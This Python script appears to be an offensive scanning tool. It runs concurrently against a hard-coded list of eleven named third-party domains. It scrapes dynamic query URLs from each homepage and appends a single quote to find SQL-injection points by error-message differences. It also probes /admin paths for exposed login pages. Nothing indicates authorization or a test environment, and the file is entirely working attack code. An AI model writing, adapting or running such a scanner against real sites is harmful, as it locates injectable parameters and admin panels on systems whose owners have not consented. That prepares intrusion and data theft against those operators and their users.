#!/usr/bin/env python3
"""batch SQLi scan on iWeb sites (quote-diff method) + admin paths"""
import urllib.request, re
from concurrent.futures import ThreadPoolExecutor, as_completed

UA = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}
SQL_ERRS = [b"Microsoft OLE DB", b"ODBC", b"Unclosed quotation", b"SQL syntax",
            b"mysql_fetch", b"Warning: mysql", b"SQLSTATE", b"Fatal error: Uncaught",
            b"SqlException", b"SqlClient", b"System.Data"]

def fetch(url, timeout=8):
    try:
        req = urllib.request.Request(url, headers=UA)
        return urllib.request.urlopen(req, timeout=timeout).read()
    except Exception:
        return b""

def scan(d):
    results = []
    try:
        home = fetch("http://" + d + "/")
    except Exception:
        return results
    if not home:
        return results
    hl = home.decode(errors="ignore")
    # dynamic URLs
    dyn = set(re.findall(r'([\w./-]+\.(?:php|asp|aspx|html)\?[\w]+=[\w]+)', hl))
    for u in list(dyn)[:3]:
        url = "http://%s/%s" % (d, u.lstrip("/"))
        r1 = fetch(url)
        r2 = fetch(url + "'")
        if r1 and r2:
            for sig in SQL_ERRS:
                if sig in r2 and sig not in r1:
                    results.append("[SQLI] %s" % url)
                    break
    # admin paths
    for p in ["/admin/login.html", "/admin/"]:
        code, b = 0, b""
        try:
            req = urllib.request.Request("http://" + d + p, headers=UA)
            r = urllib.request.urlopen(req, timeout=8)
            b = r.read(5000)
            code = r.status
        except urllib.error.HTTPError as e:
            code = e.code
        if code == 200 and len(b) > 2000:
            results.append("[ADMIN] %s" % p)
    return results

doms = ["ahbill.com", "china-haixing.com", "ahzfgg.com", "ahyyhb.net", "ahhubang.com",
        "ahhzlq.com", "ahsjkx.net", "ahxiyy.com", "ahtlt.com.cn", "ahzyhh.com",
        "ahygfz.com"]
with ThreadPoolExecutor(max_workers=11) as ex:
    futs = {ex.submit(scan, d): d for d in doms}
    for fut in as_completed(futs):
        d = futs[fut]
        res = fut.result()
        print("%s: %s" % (d, "; ".join(res) if res else "-"), flush=True)
